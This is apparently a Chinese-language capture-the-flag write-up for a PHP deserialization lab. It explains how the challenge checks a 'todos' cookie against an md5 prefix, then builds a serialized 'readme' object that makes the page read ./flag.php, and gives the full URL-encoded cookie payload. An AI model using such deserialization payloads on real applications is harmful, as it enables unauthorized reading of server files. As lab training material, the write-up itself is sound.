@@ -1,0 +1,17 @@
+反序列化靶场：
+1.本题是一道CTF的题 点击check code
+
+2.解读代码 发现使用了__toString()函数来返回Readme.txt里面的内容并且拼接source传参的内容 source传参又会传入当前文件的绝对地址
+
+3.cookie传参中有存在todos参数 定义了$c中存储todos的值 $h取$c的前32位内容 $m取$C的32位之后的所有内容 $h为md5加密过后的$m 所以综上所述得到的结论是：$c = md5($m).$m
+
+4.下面有个foreach循环遍历$todos 然后输出$todo 注意：<?=$todo?>就是<?php echo $todo;?> 是个简写 我们要找的输出位就是这里
+
+5.需要构造$todos 因为flag在flag.php中 所以在本地写个readme类的内容 将$s的值转化为数组 然后得到序列化后的值
+a:1:{i:0;O:6:"readme":1:{s:6:"source";s:10:"./flag.php";}}
+
+6.然后对这串序列化值进行md5加密 得到 fae1710f5e51885bcf095e718ca752cc
+拼接后：	fae1710f5e51885bcf095e718ca752cca:1:{i:0;O:6:"readme":1:{s:6:"source";s:10:"./flag.php";}}
+url编码后：fae1710f5e51885bcf095e718ca752cca%3a1%3a%7bi%3a0%3bO%3a6%3a%22readme%22%3a1%3a%7bs%3a6%3a%22source%22%3bs%3a10%3a%22.%2fflag.php%22%3b%7d%7d
+
+7.然后抓包修改cookie 就可以进去看到flag了
